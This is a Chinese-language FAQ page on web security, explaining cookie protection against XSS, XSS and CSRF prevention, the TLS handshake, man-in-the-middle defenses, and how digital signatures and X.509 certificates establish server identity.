---
sidebar_position: 2
---
# FAQ?
## Web 安全

### Cookie如何防范XSS攻击

XSS（跨站脚本）攻击是指攻击者在页面注入恶意 JS，从而读取或操作用户数据。Cookie 是最容易被窃取的敏感信息之一，主要防范手段是通过 Cookie 自身的属性 + 输入输出过滤。

**1. 设置 `HttpOnly` 属性（最关键）**

加了 `HttpOnly` 的 Cookie 无法通过 `document.cookie` 读取，因此即使页面被注入恶意脚本，也无法把 Cookie 偷走。这是防范 XSS 窃取 Cookie 的最有效手段。

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

```js
// 攻击者注入的脚本读取不到
document.cookie  // ""
```

**2. 设置 `Secure` 属性**

只在 HTTPS 连接下发送该 Cookie，防止中间人攻击在明文链路截获。

**3. 设置 `SameSite` 属性**

- `Strict`：完全不带 Cookie 跨站请求
- `Lax`：仅允许 GET 顶层导航带 Cookie（默认值）
- `None`：允许跨站发送（需配合 `Secure`）

主要防范 CSRF，但对部分 XSS 链路也有缓解作用。

**4. 内容安全策略（CSP）**

通过 `Content-Security-Policy` 限制脚本来源，阻断外部脚本执行：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**5. 输入输出编码**

从源头防 XSS：

- 输入校验与过滤
- 输出到 HTML 时转义 `<`、`>`、`&`、`"`、`'`
- 输出到 JS 时用 `JSON.stringify`
- 避免使用 `innerHTML`、`document.write`，改用 `textContent`

**6. 不要把敏感数据存进 Cookie**

如果可以不放，就别放；必须放就务必 `HttpOnly + Secure`。

总结：`HttpOnly` 是 Cookie 层面防 XSS 窃取的关键，但要彻底防 XSS，仍需从输入输出过滤、CSP、转义等多层入手。

### csrf和xss的网络攻击及防范

**XSS（跨站脚本攻击）** 和 **CSRF（跨站请求伪造）** 是两类最常见的 Web 安全攻击，原理和防范方式完全不同。

---

**一、XSS（Cross-Site Scripting）**

攻击者把恶意脚本注入到页面中，在受害者浏览器执行，窃取 Cookie/Session、篡改页面、模拟用户操作。

**三类 XSS：**

1. **存储型**：恶意脚本存到数据库（如评论），其他用户访问时执行
2. **反射型**：恶意代码在 URL 参数中，服务端拼接到响应里返回执行
3. **DOM 型**：完全在客户端由 JS 拼接造成（如 `innerHTML = location.hash`）

**防范：**

- **输入过滤与输出编码**：转义 `<`、`>`、`&`、`"`、`'`
- **使用 `textContent` 替代 `innerHTML`**
- **CSP（内容安全策略）**：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- **Cookie 设 `HttpOnly`**：JS 读不到 Cookie
- **框架自带转义**（React/Vue 默认转义、`dangerouslySetInnerHTML` 谨慎用）

---

**二、CSRF（Cross-Site Request Forgery）**

攻击者诱导已登录用户访问恶意页面，该页面利用浏览器会自动带 Cookie 的特性，向目标站点发送请求（如转账），冒充用户操作。

**关键点：** CSRF 不是偷 Cookie，而是借用户已有的 Cookie 身份"借刀杀人"。

**防范：**

1. **CSRF Token**：服务端下发一次性 token，前端表单/请求头带上，服务端校验

```html
<input type="hidden" name="_csrf" value="abc123" />
```

```http
X-CSRF-Token: abc123
```

2. **SameSite Cookie**：

```http
Set-Cookie: sessionId=xxx; SameSite=Strict
```

`Strict` 完全不带，`Lax`（默认）只允许顶层 GET 导航带，能挡住绝大多数 CSRF。

3. **校验 `Referer` / `Origin`**：拒绝来自非本站的请求

4. **关键操作二次验证**：短信验证码、再次输入密码

5. **避免 GET 写操作**：写操作用 POST/PUT/DELETE

---

**对比：**

| 项 | XSS | CSRF |
|----|-----|------|
| 攻击对象 | 用户的浏览器执行环境 | 用户已有的登录态 |
| 是否需要登录 | 不需要 | 需要 |
| 攻击载体 | 注入脚本 | 借助 Cookie 自动发送 |
| 核心防范 | 输出编码 + CSP + HttpOnly | Token + SameSite + Referer |

## HTTPS 与加密

### 什么是 HTTPS 协议？

HTTPS = **HTTP over TLS/SSL**，即在 HTTP 与 TCP 之间插入一层 TLS（Transport Layer Security，前身 SSL）加密层。HTTP 报文在交给 TCP 前先被 TLS 加密，接收方收到后再解密，对外看似加密的"乱码"，从而实现安全通信。

```
应用层：    HTTP
              ↓ 加密
安全层：    TLS / SSL
              ↓
传输层：    TCP
              ↓
网络层：    IP
```

**HTTPS 解决的问题（对比 HTTP 三大弱点）：**

1. **窃听风险（明文传输）** → TLS 加密，第三方无法解读内容
2. **篡改风险（无完整性校验）** → TLS 用 MAC 校验，篡改即被发现
3. **冒充风险（无身份认证）** → 数字证书 + CA 链验证服务器身份

**HTTPS 的核心要素：**

- **对称加密**：用于传输内容（如 AES、ChaCha20），快
- **非对称加密**：用于握手阶段协商对称密钥（如 RSA、ECDHE）
- **数字证书（X.509）**：服务端公钥的载体，由 CA 签名背书
- **哈希算法**：用于完整性校验（如 SHA-256）

**端口与连接：**

- HTTP 默认端口 80，HTTPS 默认端口 443
- HTTPS 需要：服务器有证书 + 私钥；客户端信任根 CA

**URL 形式：**

```
http://www.example.com         ← 明文
https://www.example.com        ← 加密
```

**HTTPS 握手简要流程：**

1. 客户端发送 ClientHello（支持的 TLS 版本、加密套件、随机数）
2. 服务端返回 ServerHello（选定的套件、随机数）+ 证书 + 公钥
3. 客户端校验证书合法性（CA 签名链、域名、有效期）
4. 客户端生成预备主密钥，用服务端公钥加密发回（或用 ECDHE 协商）
5. 双方根据随机数和预备主密钥派生出对称会话密钥
6. 后续通信用该对称密钥加密

**优点：** 加密、防篡改、身份认证、利于 SEO（搜索引擎优先收录）、浏览器显示"安全"标识。

**缺点：** 握手增加 1-2 RTT 延迟、CPU 加解密开销、证书申请成本（现已可通过 Let's Encrypt 免费获取）。

### HTTPS握手过程

HTTPS 握手即 TLS 握手，目的是协商出加密套件、验证服务端身份、生成对称密钥。以 **TLS 1.2 RSA 握手**为例（最经典的流程，已逐渐被 ECDHE 取代）：

**完整流程：**

```text
1. ClientHello
   Client → Server
   - 支持的 TLS 版本（如 1.2）
   - 客户端随机数 ClientRandom
   - 支持的加密套件列表
   - 支持的压缩方法

2. ServerHello + 证书 + ServerHelloDone
   Server → Client
   - 选定的 TLS 版本
   - 服务端随机数 ServerRandom
   - 选定的加密套件
   - X.509 数字证书（含公钥）
   - 可选：要求客户端证书

3. 客户端校验证书
   - 校验 CA 签名链 → 信任的根 CA
   - 校验域名匹配
   - 校验有效期
   - 校验吊销状态（CRL/OCSP）

4. 客户端生成预备主密钥 PreMasterSecret
   - 用服务端公钥加密后发送
   Client → Server：Encrypted PreMasterSecret
   Client → Server：ChangeCipherSpec + Finished（加密）

5. 服务端解密拿到 PreMasterSecret
   - 根据 ClientRandom + ServerRandom + PreMasterSecret
   - 派生出 MasterSecret 和会话密钥
   Server → Client：ChangeCipherSpec + Finished（加密）

6. 后续通信用对称密钥加密
```

**ECDHE 握手（TLS 1.2 现代主流 + TLS 1.3）：**

```text
1. ClientHello + 客户端 ECDHE 公钥
2. ServerHello + 服务端证书 + 服务端 ECDHE 公钥 + 签名
3. 双方用对方公钥 + 自己私钥计算出共享密钥
4. 派生出对称会话密钥
5. 后续加密通信
```

ECDHE 比 RSA 的优势：

- **前向安全（Forward Secrecy）**：即使服务器私钥日后泄露，也无法解密历史通信
- TLS 1.3 强制使用 ECDHE，禁用 RSA 密钥交换

**TLS 1.3 简化握手（1-RTT）：**

```text
Client → ClientHello + 密钥交换 + EarlyData（可选）→ Server
Client ← ServerHello + 密钥交换 + 证书 + Finished ← Server
Client → Finished
```

把多个消息合并发送，比 1.2 少一个 RTT。

**关键概念：**

- **对称加密**：用于后续数据传输（AES、ChaCha20），快
- **非对称加密**：仅用于握手阶段协商密钥（RSA、ECDHE）
- **哈希**：用于完整性校验（SHA-256）
- **CA 证书**：信任链根，验证服务器身份

**派生密钥的过程：**

```
MasterSecret = PRF(PreMasterSecret, "master secret",
                   ClientRandom + ServerRandom)

KeyBlock = PRF(MasterSecret, "key expansion",
               ServerRandom + ClientRandom)

→ 分出 client_write_key, server_write_key, MAC keys, IVs
```

### 什么是https中间人攻击，如何预防（HTTPS加密过程、原理）

**中间人攻击（Man-in-the-Middle，MITM）** 指攻击者冒充通信双方，在客户端与服务端之间转发甚至篡改数据，而双方都以为自己在和对方直接通信。在纯 HTTP 场景下，由于流量明文且无身份认证，MITM 极易发生。

**1. 攻击流程**

```text
客户端 ────请求────► [攻击者] ────请求────► 服务器
客户端 ◄──伪造响应── [攻击者] ◄──真实响应── 服务器
```

攻击者可以：
- **窃听**：读取账号、密码、Cookie 等敏感数据
- **篡改**：在响应里插入广告、恶意脚本，在请求里修改转账金额
- **冒充**：自己搭一个假网站骗取用户输入

典型手段：ARP 欺骗、DNS 污染、WiFi 劫持（钓鱼热点）、SSL Strip 降级攻击。

**2. HTTPS 如何预防 MITM**

HTTPS = HTTP + TLS，针对 MITM 的三大风险分别设防：

| 风险 | 对应机制 |
|------|----------|
| 窃听 | 对称加密传输内容（AES/ChaCha20） |
| 篡改 | MAC（消息认证码）+ AEAD 加密模式 |
| 冒充 | 数字证书 + CA 信任链验证服务端身份 |

**3. HTTPS 加密过程（TLS 1.2 简化版）**

```text
1. ClientHello
   Client → Server：支持的 TLS 版本、加密套件、ClientRandom

2. ServerHello + 证书
   Server → Client：选定的套件、ServerRandom、X.509 证书（含公钥）

3. 客户端校验证书
   - CA 签名链是否可信（追溯到系统内置根 CA）
   - 域名是否匹配
   - 是否在有效期内
   - 是否被吊销（CRL/OCSP）

4. 协商对称密钥
   - RSA 握手：客户端生成 PreMasterSecret，用服务端公钥加密发送
   - ECDHE 握手：双方交换公钥，各自算出共享密钥（前向安全）

5. 双方用 ClientRandom + ServerRandom + PreMasterSecret 派生会话密钥

6. 后续通信用对称密钥加密 + MAC 校验
```

**4. 为什么 HTTPS 能防 MITM**

- 攻击者即使截获流量也是密文，无法读取
- 即使伪造响应，没有正确的对称密钥也无法生成合法的 MAC，客户端会丢弃
- 攻击者想冒充服务端，但拿不到对应域名的私钥，证书校验过不去
- 攻击者想自签证书，浏览器会报 `NET::ERR_CERT_AUTHORITY_INVALID`

**5. 仍需注意的攻击面**

- **用户点击"继续访问"忽略证书错误** → 仍可能被 MITM
- **恶意 CA 签发假证书**（如历史上 DigiNotar 事件）→ 依赖 CA 信任链的可信度
- **SSL Strip 降级**：用 HSTS（`Strict-Transport-Security`）强制 HTTPS 解决
- **客户端被植入恶意根证书**：如企业/木马安装的根 CA，可签名任意域名的证书

**预防手段总结：** 全站 HTTPS、启用 HSTS、证书透明度（CT）、OCSP Stapling、禁用弱算法（RSA 密钥交换、SHA-1、TLS 1.0/1.1）、用户不要忽略证书告警。

### https 协议的优点

HTTPS = HTTP + TLS，相比 HTTP 提供了**加密、完整性、身份认证**三大安全保障，同时在生态上也有优势。

**1. 安全性上的优点**

| 风险 | HTTP | HTTPS 对应机制 |
|------|------|----------------|
| 窃听 | 明文传输，流量可被任意读取 | 对称加密（AES/ChaCha20） |
| 篡改 | 无完整性校验 | MAC / AEAD 校验 |
| 冒充 | 无身份认证 | 数字证书 + CA 信任链 |

具体场景：
- 公共 WiFi 不再能被嗅探到密码、Cookie
- 运营商无法插入广告、跳转
- 钓鱼网站拿不到对应域名的私钥，无法伪造服务端

**2. 数据完整性**

TLS 用 AEAD 模式（如 AES-GCM、ChaCha20-Poly1305）把加密和完整性校验合在一起，**任何字节被篡改都会被检测出来**，攻击者无法在密文中插入恶意脚本。

**3. 身份认证**

- 服务端通过 X.509 数字证书证明自己的身份
- 证书由 CA（证书颁发机构）签名，浏览器内置受信任根 CA
- 客户端可以确认「我确实在和 example.com 通信，而不是冒充者」
- 双向 TLS（mTLS）还可以让服务端验证客户端身份

**4. 利于 SEO**

- Google、百度等搜索引擎**优先收录 HTTPS 站点**
- 浏览器地址栏显示「安全锁」标识，提升用户信任
- 新的 Web API（如 Service Worker、Geolocation、getUserMedia、Push API、IndexedDB 等）**强制要求 HTTPS**（或 localhost）

**5. 支持现代协议**

- HTTP/2 在浏览器中**强制基于 TLS**（h2 over TLS）
- HTTP/3 基于 QUIC，强制 TLS 1.3
- HSTS、CSP、Cookie `Secure` 等安全机制依赖 HTTPS

**6. 利于合规与生态**

- 等保、GDPR、PCI-DSS 等都要求传输加密
- 应用商店（iOS/Android）要求 App 后端必须 HTTPS
- 小程序、PWA、第三方支付都强制 HTTPS

**7. 性能优化的基础**

- TLS 1.3 把握手简化到 1-RTT，0-RTT 复用更快
- HTTP/2 的多路复用基于 TLS
- Session Resumption、OCSP Stapling 进一步降低延迟

**8. 免费普及**

- Let's Encrypt 提供免费证书
- ACME 协议自动化签发与续期
- CDN、云厂商免费提供 SSL

**总结**：HTTPS 在安全、信任、SEO、功能支持上全面优于 HTTP，已是现代 Web 的标配。

### https 协议的缺点

HTTPS 在安全上远胜 HTTP，但也带来一些代价：**握手延迟、计算开销、证书成本、部署复杂度**。现代技术已大幅缓解，但仍需权衡。

**1. 握手延迟**

- HTTP：TCP 三次握手后立即发数据（1 RTT）
- HTTPS（TLS 1.2）：TCP 三次握手（1 RTT）+ TLS 握手（1-2 RTT）+ 数据
- 首次访问要多 1-2 个 RTT 才能开始传输应用数据

```text
TLS 1.2  ≈ 2 RTT 握手
TLS 1.3  ≈ 1 RTT 握手（首连），0-RTT（复用）
```

**缓解方式**：Session Resumption、TLS 1.3 0-RTT、OCSP Stapling、TLS False Start。

**2. CPU 计算开销**

- 握手阶段用非对称加密（RSA、ECDHE），计算量大
- 数据传输用对称加密（AES、ChaCha20），开销相对小但仍消耗 CPU
- 大量并发连接时服务器 CPU 上升明显

**缓解方式**：
- AES-NI 指令集硬件加速
- Session Resumption 复用握手结果
- SSL 卸载（在反向代理或负载均衡层处理 TLS，后端用明文）
- 使用 ECDSA 证书（比 RSA 签名快）

**3. 证书成本**

- 早期商业证书昂贵（年费数百到数千元）
- 现已可通过 Let's Encrypt 免费、自动化获取
- EV、OV 等高保证证书仍需付费
- 通配符、多域名证书成本更高

**4. 部署与维护复杂度**

- 需要申请、配置、续期证书（自动化可缓解）
- 证书链配置错误会导致浏览器报错
- 证书吊销机制（CRL/OCSP）增加复杂度
- 多机房、多 CDN 部署需要同步证书和私钥
- 域名与证书要严格对应，扩容/迁移时容易遗漏

**5. 仍可能存在的安全风险**

- 用户忽略证书告警仍可能被 MITM
- 中间 CA 被入侵或恶意签发（如 DigiNotar 事件）
- 客户端被植入恶意根证书
- TLS 1.2 早期算法（RSA、SHA-1、CBC）有已知漏洞
- 0-RTT 有重放攻击风险

**6. 加密带来的副作用**

- **流量审查困难**：企业 IT、家长监控、防火墙难以审计内容
- **缓存与优化受影响**：中间代理无法缓存 HTTPS 内容，CDN 必须自己做 SSL 卸载
- **调试复杂**：抓包看到的是密文，需在服务器侧导出密钥（`SSLKEYLOGFILE`）才能在 Wireshark 中解密

**7. 兼容性**

- 旧客户端可能不支持 TLS 1.3
- 部分企业网络对 443 端口有限制
- HTTPS 加密 SNI（ESNI/ECH）部署尚在推进中

**8. 能耗与带宽**

- 加密数据比明文略增（每条记录加 TLS 头）
- 移动设备加解密消耗电池

**总结**：HTTPS 的缺点主要是**握手延迟、CPU 开销、部署复杂度**，但硬件加速 + TLS 1.3 + 免费证书已经把代价降到很低，远小于安全收益。

### 为什么https数据传输使用对称加密

HTTPS 在**握手阶段用非对称加密协商密钥，数据传输阶段用对称加密传输内容**。为什么数据传输不用非对称加密？核心原因是**性能、适用场景与安全性**的综合权衡。

**1. 非对称加密 vs 对称加密**

| 对比项 | 非对称加密 | 对称加密 |
|--------|------------|----------|
| 密钥 | 公钥/私钥一对 | 单一密钥 |
| 算法 | RSA、ECDHE、ECDSA | AES、ChaCha20 |
| 计算速度 | 慢（比对称慢 100-1000 倍） | 快（AES-NI 硬件加速） |
| 适合大数据量 | 否 | 是 |
| 解决密钥分发 | 是 | 否（密钥怎么传？） |

**2. 为什么不直接用非对称加密传输？**

- **太慢**：RSA 加解密 1MB 数据可能要数百毫秒，AES 只要几毫秒
- **CPU 开销大**：服务端要同时处理大量连接，非对称加密每条连接都跑会拖垮 CPU
- **数据长度限制**：RSA 加密的明文长度受密钥长度限制（如 2048 位 RSA 只能加密约 245 字节）
- **不适合流式传输**：HTTP 是字节流，非对称加密对大块数据不友好

**3. 为什么不全程对称加密？**

对称加密的问题是**密钥分发**：客户端和服务端怎么安全地协商出同一个对称密钥？如果直接发，攻击者也能拿到。

所以需要**用非对称加密来安全地协商对称密钥**：

```text
握手阶段：
  - 非对称加密（RSA/ECDHE）安全交换 PreMasterSecret
  - 双方派生出对称会话密钥

数据传输阶段：
  - 用对称密钥加密数据（AES/ChaCha20）
  - 速度快，CPU 友好
```

**4. 完整流程**

```text
1. ClientHello
2. ServerHello + 证书（服务端公钥）
3. 客户端校验证书，生成 PreMasterSecret
   - RSA 模式：用服务端公钥加密发回
   - ECDHE 模式：双方交换公钥算出共享密钥
4. 双方派生对称会话密钥（基于 ClientRandom + ServerRandom + PreMasterSecret）
5. 后续通信用对称密钥加密
```

**5. 为什么是这种混合加密？**

- **非对称加密** 解决「密钥分发」难题，但慢
- **对称加密** 适合大数据量传输，但要先有共享密钥
- 取两者之长：用非对称加密解决密钥分发，用对称加密跑数据

这是几乎所有加密通信协议（TLS、SSH、IPsec、Signal）共同的设计思路。

**6. 完整性也用对称技术**

TLS 还用 MAC（消息认证码）或 AEAD 模式（如 AES-GCM）保证数据完整性，本质上也是基于对称密钥的。

**7. ECDHE 的前向安全**

TLS 1.3 强制 ECDHE 而非 RSA 密钥交换：即使服务端私钥日后泄露，由于每次握手都用临时 ECDHE 密钥对，攻击者也无法解密历史抓包。

**总结**：HTTPS 数据传输用对称加密，是因为它**快、CPU 友好、适合流式数据**；但握手阶段必须用非对称加密来安全协商对称密钥。这是性能与安全的最佳折衷。

### HTTPS 握手过程中，客户端如何验证证书的合法性

TLS 握手时，服务端会发来 X.509 数字证书。客户端必须**校验证书合法性**，确认「这真的是 example.com 的证书，且来自可信的 CA」。

**1. 校验完整链路**

```text
1. 证书链验证（追溯到系统内置根 CA）
2. 域名匹配（证书是否覆盖当前访问的域名）
3. 有效期（是否过期/未生效）
4. 吊销状态（是否被 CA 废止）
5. 签名算法（是否用弱算法）
6. 证书用途（是否允许用作服务端认证）
```

**2. 证书链验证（核心）**

X.509 证书包含：签发者、使用者、公钥、有效期、签名算法、CA 的签名。

```text
根证书（Root CA）           ← 系统内置，自签名
  └─ 签发 中间证书（Intermediate CA）
       └─ 签发 服务端证书（example.com）
```

客户端收到的是「服务端证书 + 中间证书」，有时只发服务端证书（中间证书浏览器可能已缓存或自己补全）。

校验过程：
- 用中间 CA 的公钥验证服务端证书的签名 → 通过说明是中间 CA 签的
- 用根 CA 的公钥验证中间 CA 证书的签名 → 通过说明是根 CA 签的
- 根 CA 是系统内置信任的，整条链可信

任何一层签名对不上，校验失败。

**3. 域名匹配**

证书的 `Subject Alternative Name (SAN)` 字段列出所有受保护的域名：

```text
Subject Alternative Name:
  DNS: example.com
  DNS: www.example.com
  DNS: *.example.com    ← 通配符，匹配 a.example.com、b.example.com
```

校验规则：
- 浏览器访问的域名必须出现在 SAN 中
- 通配符 `*.example.com` 只匹配一层子域（不匹配 `a.b.example.com`）
- HTTP/1.1 的 `Host` 头或 TLS SNI 决定要校验哪个域名

**4. 有效期**

- 证书的 `Not Before` 和 `Not After` 字段
- 当前时间必须在区间内
- 过期或未生效 → 报错 `NET::ERR_CERT_DATE_INVALID`
- 系统时间不正确也会导致校验失败

**5. 吊销状态**

CA 可以吊销已签发的证书（私钥泄露、误发等），客户端必须检查：

- **CRL（Certificate Revocation List）**：CA 发布的吊销列表，客户端下载查询。更新慢、文件大，已少用。
- **OCSP（Online Certificate Status Protocol）**：实时查询某证书是否吊销。
- **OCSP Stapling**：服务端在握手时主动附带 OCSP 响应，避免客户端再去查（隐私 + 速度）。
- **CRLite**：Firefox 推出的压缩吊销检查机制。

如果吊销查询失败，浏览器通常**软失败**（继续连接，但提示警告）。

**6. 签名算法**

- 必须用安全算法（RSA-PSS、ECDSA、Ed25519）
- SHA-1 已被废弃
- RSA-PKCS#1 v1.5 + SHA-1 → 拒绝
- RSA 密钥 &lt; 2048 位 → 拒绝

**7. 证书用途**

证书扩展 `Key Usage` 和 `Extended Key Usage` 限制用途：
- `serverAuth`（TLS Web Server Authentication）→ 允许用作 HTTPS 服务端
- `clientAuth` → 允许用作客户端认证（mTLS）
- 服务端证书必须包含 `serverAuth`

**8. HSTS 强制**

如果域名在 HSTS 列表（`Strict-Transport-Security` 或浏览器内置 preload list）中，浏览器会**强制走 HTTPS 且严格校验证书**，不允许用户点击「继续访问」绕过证书错误。

**9. 证书透明度（CT）**

主流 CA 签发的证书要提交到 CT Log，浏览器校验证书是否被公开记录，防止 CA 私自签发未公开证书。Chrome 要求 EV、证书必须支持 SCT（Signed Certificate Timestamp）。

**10. 校验失败的常见错误**

| 错误码 | 含义 |
|--------|------|
| `ERR_CERT_AUTHORITY_INVALID` | 自签证书 / 中间证书缺失 / 根 CA 不信任 |
| `ERR_CERT_COMMON_NAME_INVALID` | 域名不匹配 |
| `ERR_CERT_DATE_INVALID` | 过期或未生效 |
| `ERR_CERT_REVOKED` | 证书被吊销 |
| `ERR_CERT_WEAK_SIGNATURE_ALGORITHM` | 用了 SHA-1 等弱算法 |
| `ERR_SSL_VERSION_OR_CIPHER_MISMATCH` | TLS 版本或加密套件不匹配 |

**总结**：客户端通过证书链追溯根 CA、域名匹配、有效期、吊销状态、签名算法、用途扩展等多维度校验，确认服务端证书可信。任何一项失败浏览器都会拦截并提示用户。

### 数字签名？它是什么

**数字签名（Digital Signature）** 是基于非对称加密的一种机制，用来证明「这个消息确实是由某个特定的发送方发出的，且没有被篡改」。它解决了网络通信中的**身份认证**和**完整性**问题。

**1. 原理**

数字签名用**私钥签名，公钥验签**：

```text
发送方：
  原文 ──哈希──► 摘要 ──私钥加密──► 签名
  把「原文 + 签名」一起发送

接收方：
  收到「原文 + 签名」
  原文 ──哈希──► 摘要1
  签名 ──公钥解密──► 摘要2
  比对摘要1 与摘要2：
    相等 → 验签通过（确实来自私钥持有者，且未被篡改）
    不等 → 验签失败
```

**为什么先哈希再签名？**
- 直接签名长文本太慢（非对称加密慢）
- 哈希把任意长度压缩成固定长度摘要，再签名摘要，性能可控
- 哈希不可逆，攻击者无法从摘要反推原文

**2. 算法**

- 签名算法 = 哈希算法 + 非对称加密算法
- 常见组合：
  - `RSA-SHA256`：RSA 签名 + SHA-256 哈希
  - `ECDSA-SHA256`：椭圆曲线签名
  - `Ed25519`：现代快速签名算法
- 哈希算法：SHA-256、SHA-384、SHA-512（MD5、SHA-1 已不安全）

**3. 关键特性**

| 特性 | 说明 |
|------|------|
| 不可伪造 | 只有私钥持有者能生成有效签名 |
| 不可篡改 | 任何字节改动都会让验签失败 |
| 不可否认 | 签名者日后无法否认「我没签过」 |
| 可公开验证 | 任何拿到公钥的人都能验签 |

**4. 与「加密」的区别**

```text
加密：用对方的公钥加密，对方用私钥解密 → 防止窃听
签名：用自己的私钥签名，对方用我的公钥验签 → 防止冒充和篡改
```

| 对比项 | 加密 | 签名 |
|--------|------|------|
| 解决问题 | 机密性 | 身份认证 + 完整性 |
| 用什么密钥 | 对方公钥加密 | 自己私钥签名 |
| 验证密钥 | 自己私钥解密 | 自己公钥验签 |

**5. 在 HTTPS 中的应用**

- CA 用自己的私钥对服务端证书签名
- 浏览器内置 CA 公钥（根证书）
- 浏览器用 CA 公钥验签 → 确认证书确实是该 CA 签发的
- 服务端证书中的公钥用于后续密钥交换

**6. 代码示例（Node.js）**

```js
const crypto = require('crypto')
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
})

// 签名
const sign = crypto.createSign('SHA256')
sign.update('hello')
sign.end()
const signature = sign.sign(privateKey)

// 验签
const verify = crypto.createVerify('SHA256')
verify.update('hello')
verify.end()
console.log(verify.verify(publicKey, signature))  // true
```

**7. 应用场景**

- HTTPS 证书签名
- JWT（JSON Web Token）的签名部分
- 软件包签名（npm、apk 签名）
- Git commit 签名
- 区块链交易签名
- 电子合同、电子发票

**总结**：数字签名 = 哈希 + 非对称加密 + 私钥签名/公钥验签，提供身份认证 + 完整性 + 不可否认性，是 HTTPS、JWT、电子签章等安全机制的基础。

### 谈谈对数字证书的理解

**数字证书（Digital Certificate）** 是由权威第三方（CA，Certificate Authority）签发的、用于证明「公钥确实属于某个主体」的电子文件。它解决了公钥分发中的信任问题。

**1. 解决什么问题**

非对称加密中，公钥可以公开，但客户端怎么知道「这个公钥真的是 example.com 的，而不是中间人冒充的」？

- 直接发公钥 → 中间人可以替换成自己的公钥
- 通过可信渠道发布 → 不现实，全球那么多域名
- 通过第三方 CA 签名背书 → 数字证书方案

**2. 证书的核心内容（X.509）**

```text
Version: v3
Serial Number: 0x...
Signature Algorithm: SHA256-RSA
Issuer: CN=Let's Encrypt R3, O=Let's Encrypt, C=US    ← 签发者
Validity:
  Not Before: Jul  9 00:00:00 2026
  Not After : Oct  7 23:59:59 2026                      ← 有效期
Subject: CN=example.com                                ← 使用者
Subject Public Key Info:                               ← 公钥
  Algorithm: RSA
  Public-Key: (2048 bit)
Subject Alternative Name (SAN):                        ← 域名列表
  DNS:example.com, DNS:www.example.com
Extensions:
  Key Usage: Digital Signature, Key Encipherment
  Extended Key Usage: TLS Web Server Authentication
  Authority Information Access: OCSP URI
Signature: <CA 的私钥对本证书的签名>                    ← 关键！
```

**3. 证书链**

```text
根证书（自签名，浏览器/系统内置信任）
  └─ 中间证书（Intermediate CA，由根 CA 签）
       └─ 终端证书（example.com，由中间 CA 签）
```

- 根 CA 离线、安全级别最高
- 中间 CA 日常签发证书
- 浏览器只需信任根 CA，通过链式签名验证终端证书

**4. CA 的角色与责任**

- **身份核实**：DV（域名验证）、OV（组织验证）、EV（扩展验证）
- **签发证书**：用 CA 私钥对证书签名
- **管理吊销**：CRL、OCSP
- **保持中立可信**：CA 一旦作恶（误发证书）会被浏览器移除信任，如 DigiNotar 事件

**5. 证书类型**

| 类型 | 验证内容 | 浏览器标识 | 价格 |
|------|----------|-----------|------|
| DV | 仅域名所有权 | 普通锁 | 免费/低 |
| OV | 域名 + 公司信息 | 普通锁 | 中 |
| EV | 严格公司 + 电话 + 文件 | 旧版显示公司名 | 高 |
| 通配符 | `*.example.com` 一个证书覆盖多子域 | 普通锁 | 中 |
| 多域名（SAN） | 一张证书覆盖多个域名 | 普通锁 | 中 |
| 代码签名 | 给软件签名 | — | 高 |

**6. 申请与签发流程**

```text
1. 服务器生成密钥对（公钥 + 私钥）
2. 生成 CSR（Certificate Signing Request）：包含公钥 + 域名 + 公司信息
3. 提交 CSR 给 CA
4. CA 验证域名/公司身份
5. CA 用自己的私钥对证书签名
6. 颁发证书给申请者
7. 部署到服务器，TLS 握手时发给客户端
8. 客户端用内置 CA 公钥验签
```

**7. Let's Encrypt 与 ACME**

- 免费签发 DV 证书
- ACME 协议自动化：申请、验证、续期
- certbot 等工具一行命令搞定
- 推动了全站 HTTPS 普及

**8. 证书吊销**

证书被签发后仍可能要废止（私钥泄露、误发等）：
- CRL：吊销列表文件
- OCSP：实时查询接口
- OCSP Stapling：服务端握手时附带 OCSP 响应
- CRLite、CT 提升效率与可审计性

**9. 证书透明度（CT）**

CA 签发的证书要提交到公开 CT Log，防止 CA 私自乱发证书。浏览器要求证书附带 SCT（Signed Certificate Timestamp）。

**总结**：数字证书是「公钥 + 身份信息 + CA 签名」的打包，让客户端可以信任服务端的公钥。它是 HTTPS、mTLS、代码签名、邮件签名等场景的基础设施。

### 为什么说数字证书就能对通信方的身份进行验证呢

数字证书能验证身份的核心是 **CA 的信任链 + 数字签名机制**：CA 用私钥给服务端证书签名，客户端用内置的 CA 公钥验签，从而确认「这个公钥确实属于证书中写的域名」。

**1. 关键链条：信任是怎么传递的**

```text
① 浏览器/操作系统内置根 CA 证书（含根 CA 公钥）
       ↓ 信任根 CA
② 根 CA 用私钥给中间 CA 证书签名
       ↓ 验签通过 → 信任中间 CA
③ 中间 CA 用私钥给 example.com 证书签名
       ↓ 验签通过 → 信任 example.com 证书
④ 证书里的公钥确实是 example.com 的
       ↓
⑤ 用该公钥加密的预备主密钥，只有 example.com 的私钥能解
       ↓
⑥ 双方协商出对称密钥，开始加密通信
```

每一层的信任都靠**数字签名**传递下来。

**2. 为什么中间人无法冒充？**

假设攻击者想冒充 example.com：

- **攻击者自签证书**：浏览器没有内置攻击者的根 CA → 验签失败 → `ERR_CERT_AUTHORITY_INVALID`
- **攻击者去申请 example.com 的证书**：CA 会做域名验证（DV），要求申请者证明对 example.com 的控制权（如往域名放特定文件、改 DNS TXT 记录），攻击者过不了
- **攻击者偷走 example.com 的私钥**：可以冒充，但服务端运营者一旦发现应立即向 CA 申请吊销证书
- **攻击者入侵 CA 假签证书**：历史上发生过（DigiNotar），但会被浏览器移除该 CA 的信任，且 CT Log 公开所有签发的证书，可被发现

**3. 为什么验签能证明身份？**

数字签名有两个关键性质：

- **不可伪造**：没有 CA 私钥就无法生成有效签名（私钥永远不离开 CA）
- **绑定身份**：证书里写明 `Subject = example.com`，CA 在签名时已经核实过申请者对该域名的控制权

所以「能用 CA 公钥验签通过的证书，就一定是该 CA 签发的，证书里写的公钥就一定属于 Subject 标识的主体」。

**4. 严格校验的完整维度**

光有签名验签还不够，浏览器还要校验：

| 维度 | 不校验会怎样 |
|------|--------------|
| 签名链追溯根 CA | 任何人都可自签证书冒充 |
| 域名匹配（SAN） | 拿 a.com 的证书冒充 b.com |
| 有效期 | 过期证书可能已不安全 |
| 吊销状态（OCSP/CRL） | 私钥泄露后该证书应作废 |
| 证书用途（EKU = serverAuth） | 客户端证书不能用作服务端 |
| 签名算法强度 | SHA-1 已被攻破 |
| 证书透明度 SCT | 防止 CA 私自乱发 |

